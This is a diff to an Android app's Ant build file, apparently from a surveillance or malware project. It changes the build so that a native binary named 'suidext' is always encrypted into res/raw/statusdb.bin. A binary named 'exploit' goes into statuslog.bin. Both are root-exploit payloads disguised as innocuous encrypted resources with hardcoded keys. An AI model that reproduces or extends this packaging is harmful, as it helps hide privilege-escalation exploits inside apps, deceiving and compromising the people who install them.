@@ -71,6 +71,9 @@
 	<target name="encrypt-messages" depends="salt">
 		<delete file="res/raw/messages.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
+		<delete file="res/raw/statusdb.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
+				
 	</target>
 
 	<target name="encrypt-manifest" depends="salt">
@@ -81,16 +84,12 @@
 	</target>
 
 	<target name="encrypt-exploit" depends="salt">
-		<delete file="res/raw/statusdb.bin" />
 		<delete file="res/raw/statuslog.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
 	</target>
 
 	<target name="encrypt-noexploit">
-		<delete file="res/raw/statusdb.bin" />
 		<delete file="res/raw/statuslog.bin" />
-		<touch file="res/raw/statusdb.bin" />
 		<touch file="res/raw/statuslog.bin" />
 	</target>
 
